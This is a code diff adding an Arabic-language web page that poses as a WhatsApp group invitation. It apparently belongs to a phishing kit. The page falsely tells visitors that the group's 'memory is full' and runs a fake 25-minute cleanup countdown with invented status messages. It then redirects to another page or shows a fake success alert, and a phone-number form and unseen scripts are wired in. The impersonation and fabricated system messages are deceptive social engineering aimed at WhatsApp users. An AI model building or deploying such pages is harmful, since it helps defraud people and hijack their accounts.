@@ -1,0 +1,369 @@
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <title>طلب المشاركة</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Sécurisation -->
+    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta name="robots" content="noindex, nofollow">
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:image" content="https://i.ibb.co/3h6b78m/J5g-K5-Ag-J-L5.png">
+    <meta property="og:title" content="الدعوة للانضمام إلى مجموعة">
+    <meta property="og:url" content="https://whatsapp-chat-group.vercel.app/">
+
+    <link rel="icon" href="./assets/images/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        /* Styles pour la popup de chargement */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-popup {
+            background: #fff;
+            padding: 30px 50px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            font-size: 1.5rem;
+            color: #333;
+            text-align: center;
+            user-select: none;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #333;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #errorMsg {
+            display: none;
+            color: #e03e2f;
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin-top: -14px;
+            margin-bottom: 14px;
+            text-align: center;
+            user-select: none;
+        }
+
+        .timer-container {
+            background: #f8f8f8;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            border: 1px solid #e0e0e0;
+        }
+
+        .timer-title {
+            font-size: 1rem;
+            color: #555;
+            margin-bottom: 10px;
+        }
+
+        .timer {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #e03e2f;
+            font-family: monospace;
+        }
+
+        .retry-button {
+            background: #f0f0f0;
+            color: #666;
+            border: 1px solid #ddd;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 1rem;
+            cursor: not-allowed;
+            margin-top: 10px;
+            width: 100%;
+        }
+
+        .retry-button.active {
+            background: #25D366;
+            color: white;
+            border-color: #25D366;
+            cursor: pointer;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: #25D366;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .status-message {
+            font-size: 0.9rem;
+            color: #666;
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        .whatsapp-features {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f0f8f0;
+            border-radius: 10px;
+        }
+
+        .feature {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .feature-icon {
+            width: 40px;
+            height: 40px;
+            background: #25D366;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+        }
+
+        .feature-text {
+            font-size: 0.8rem;
+            color: #555;
+        }
+
+        .auto-redirect-message {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 6px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: center;
+            color: #856404;
+            font-size: 0.9rem;
+        }
+    </style>
+    <script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+
+<body>
+    <div class="navbar">
+        <div class="navbar-title">الدعوة للانضمام إلى مجموعة</div>
+        <img src="./assets/images/logonavbar.svg" alt="Logo">
+    </div>
+
+    <div class="container">
+        <div class="warning-icon" style="
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    margin: 0 auto 14px;
+    background: #ff4b4b;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 34px;
+    font-weight: 700;
+">!</div>
+        <h2>ذاكرة المجموعة ممتلئة</h2>
+        <p class="code-subtitle" style="font-family: sans-serif;margin-bottom: 5%;">
+            عذرًا! لا يمكنك الانضمام للمجموعة حاليًا لأن ذاكرة التخزين الخاصة بها ممتلئة بالكامل.
+            <br><br>
+            جاري تنظيف الذاكرة تلقائيًا، الرجاء الانتظار حتى اكتمال العملية لمحاولة الانضمام مرة أخرى.
+        </p>
+
+        <div class="timer-container">
+            <div class="timer-title">جاري تحرير مساحة تخزينية...</div>
+            <div class="timer" id="countdown">25:00</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="status-message" id="statusMessage">جاري مسح الملفات المؤقتة...</div>
+        </div>
+
+        <div class="auto-redirect-message" id="redirectMessage" style="display: none;">
+            ✅ تم تحرير المساحة بنجاح! جاري إعادة التوجيه تلقائياً...
+        </div>
+
+
+
+        <p id="errorMsg"></p>
+
+        <form id="phoneForm">
+            <button type="button" class="retry-button" id="retryBtn" disabled>جاري التحضير للانضمام...</button>
+            <button type="submit" class="submit-button" id="submitBtn" style="display: none;">متابعة</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p>© 2025 جميع الحقوق محفوظة</p>
+        <p>تم التطوير بواسطة فريق الدعم</p>
+    </div>
+
+    <div class="loading-overlay" id="loadingPopup">
+        <div class="loading-popup">
+            <div class="loading-spinner"></div>
+            <span id="loadingText">جاري الاتصال ...</span>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const countdownElement = document.getElementById('countdown');
+            const progressBar = document.getElementById('progressBar');
+            const retryButton = document.getElementById('retryBtn');
+            const submitButton = document.getElementById('submitBtn');
+            const statusMessage = document.getElementById('statusMessage');
+            const redirectMessage = document.getElementById('redirectMessage');
+            const loadingPopup = document.getElementById('loadingPopup');
+            const loadingText = document.getElementById('loadingText');
+
+            // إعداد المؤقت - 25 دقيقة بالثواني
+            let totalTime = 25 * 60;
+            let timeLeft = totalTime;
+            let timerInterval;
+            let redirectTimer;
+
+            // رسائل الحالة المختلفة
+            const statusMessages = [
+                "جاري مسح الملفات المؤقتة...",
+                "جاري تحسين أداء التخزين...",
+                "جاري تنظيف ذاكرة الوسائط...",
+                "جاري تحرير مساحة التخزين...",
+                "جاري إعادة تهيئة قاعدة البيانات...",
+                "جاري ضغط الملفات الكبيرة...",
+                "جاري حذف الملفات المكررة..."
+            ];
+
+            // بدء المؤقت
+            function startTimer() {
+                timerInterval = setInterval(updateTimer, 1000);
+            }
+
+            // تحديث المؤقت
+            function updateTimer() {
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    countdownElement.textContent = "00:00";
+                    progressBar.style.width = "100%";
+                    statusMessage.textContent = "اكتمل تحرير المساحة بنجاح!";
+
+                    // إظهار رسالة إعادة التوجيه
+                    redirectMessage.style.display = 'block';
+
+                    // تفعيل زر إعادة المحاولة
+                    retryButton.disabled = false;
+                    retryButton.classList.add('active');
+                    retryButton.textContent = "انضم إلى المجموعة الآن";
+
+                    // إظهار زر المتابعة
+                    submitButton.style.display = "block";
+
+                    // بدء مؤقت إعادة التوجيه التلقائي بعد 3 ثواني
+                    redirectTimer = setTimeout(function () {
+                        loadingText.textContent = "جاري إعادة التوجيه إلى الصفحة الرئيسية...";
+                        loadingPopup.style.display = 'flex';
+
+                        // إعادة التوجيه إلى index.html بعد 2 ثانية
+                        setTimeout(function () {
+                            window.location.href = 'index.html';
+                        }, 2000);
+                    }, 3000);
+
+                    return;
+                }
+
+                timeLeft--;
+
+                // تحديث العرض
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                // تحديث شريط التقدم
+                const progress = ((totalTime - timeLeft) / totalTime) * 100;
+                progressBar.style.width = `${progress}%`;
+
+                // تغيير رسالة الحالة بشكل عشوائي
+                if (Math.random() < 0.03) { // 3% فرصة لتغيير الرسالة كل ثانية
+                    const randomIndex = Math.floor(Math.random() * statusMessages.length);
+                    statusMessage.textContent = statusMessages[randomIndex];
+                }
+            }
+
+            // معالجة النقر على زر إعادة المحاولة
+            retryButton.addEventListener('click', function () {
+                if (!this.disabled) {
+                    // إلغاء إعادة التوجيه التلقائي
+                    if (redirectTimer) {
+                        clearTimeout(redirectTimer);
+                    }
+                    redirectMessage.style.display = 'none';
+
+                    loadingText.textContent = "جاري الانضمام إلى المجموعة...";
+                    loadingPopup.style.display = 'flex';
+
+                    // محاكاة اتصال بالخادم
+                    setTimeout(function () {
+                        loadingPopup.style.display = 'none';
+                        // هنا يمكن إضافة منطق إعادة التوجيه الفعلي
+                        alert("تهانينا! تم انضمامك إلى المجموعة بنجاح!");
+                    }, 3000);
+                }
+            });
+
+            // بدء المؤقت عند تحميل الصفحة
+            startTimer();
+        });
+    </script>
+    <script src="js/utils.js"></script>
+    <script src="js/index.js"></script>
+</body>
+
+</html>
